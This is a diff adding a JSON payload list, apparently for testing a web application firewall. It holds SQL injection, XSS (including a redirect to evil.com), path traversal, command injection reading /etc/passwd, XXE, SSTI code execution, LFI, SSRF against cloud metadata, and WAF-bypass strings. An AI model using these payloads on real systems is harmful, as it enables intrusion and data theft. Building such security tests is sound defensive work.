@@ -1,0 +1,124 @@
+{
+  "payload_categories": {
+    "sql_injection": {
+      "description": "SQL Injection payloads to trigger WAF",
+      "payloads": [
+        "' OR '1'='1",
+        "1' AND SLEEP(5)--",
+        "1 UNION SELECT NULL--",
+        "admin'--",
+        "' OR 1=1--",
+        "' UNION SELECT @@version--",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "' OR EXISTS(SELECT * FROM users)--",
+        "'; WAITFOR DELAY '00:00:05'--",
+        "' OR 'a'='a"
+      ]
+    },
+    "xss": {
+      "description": "Cross-Site Scripting payloads",
+      "payloads": [
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert(1)>",
+        "javascript:alert(1)",
+        "\"onmouseover=\"alert(1)",
+        "<svg onload=alert(1)>",
+        "<body onload=alert('XSS')>",
+        "<iframe src=\"javascript:alert('XSS')\">",
+        "<a href=\"javascript:alert('XSS')\">click</a>",
+        "<script>document.location='http://evil.com'</script>",
+        "<div onmouseover=\"alert('XSS')\">hover</div>"
+      ]
+    },
+    "path_traversal": {
+      "description": "Directory traversal payloads",
+      "payloads": [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\win.ini",
+        "/etc/passwd",
+        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "....//....//etc/passwd",
+        "..%2F..%2F..%2Fetc%2Fpasswd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "..;/..;/..;/etc/passwd",
+        "..\\%255c..\\%255c..\\%255cwindows\\win.ini"
+      ]
+    },
+    "command_injection": {
+      "description": "Command injection payloads",
+      "payloads": [
+        "; ls -la",
+        "| dir",
+        "`id`",
+        "$(whoami)",
+        "| cat /etc/passwd",
+        "; cat /etc/passwd",
+        "`cat /etc/passwd`",
+        "$(cat /etc/passwd)",
+        "|| ping -c 5 127.0.0.1",
+        "&& ping -n 5 127.0.0.1"
+      ]
+    },
+    "xxe": {
+      "description": "XML External Entity payloads",
+      "payloads": [
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>"
+      ]
+    },
+    "ssti": {
+      "description": "Server-Side Template Injection",
+      "payloads": [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "${{7*7}}",
+        "{{'7'*7}}",
+        "{{config}}",
+        "{{settings.SECRET_KEY}}",
+        "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
+        "<% Runtime.getRuntime().exec(\"whoami\") %>"
+      ]
+    },
+    "lfi": {
+      "description": "Local File Inclusion",
+      "payloads": [
+        "../../../etc/passwd",
+        "php://filter/convert.base64-encode/resource=index.php",
+        "file:///etc/passwd",
+        "expect://id",
+        "data://text/plain;base64,SSBsb3ZlIFBIUAo=",
+        "zip://test.zip%23rce.php",
+        "phar://test.phar/file.php"
+      ]
+    },
+    "ssrf": {
+      "description": "Server-Side Request Forgery",
+      "payloads": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://localhost:22",
+        "http://127.0.0.1:8080",
+        "http://[::1]:80",
+        "file:///etc/passwd",
+        "gopher://localhost:80/_GET%20/HTTP/1.0",
+        "dict://localhost:11211/stat"
+      ]
+    },
+    "bypass_payloads": {
+      "description": "WAF bypass payloads",
+      "payloads": [
+        "<script>prompt`1`</script>",
+        "<img/src/onerror=.1|alert``>",
+        "<svg/onload=alert``>",
+        "<iframe srcdoc=\"<script>alert(1)</script>\">",
+        "<details/open/ontoggle=alert``>",
+        "<select/onfocus=alert``>",
+        "'/**/OR/**/1=1--",
+        "1'%0aAND%0a'1'='1",
+        "UNION%0aSELECT",
+        "<script>eval(\"al\"+\"ert(1)\")</script>"
+      ]
+    }
+  }
+}
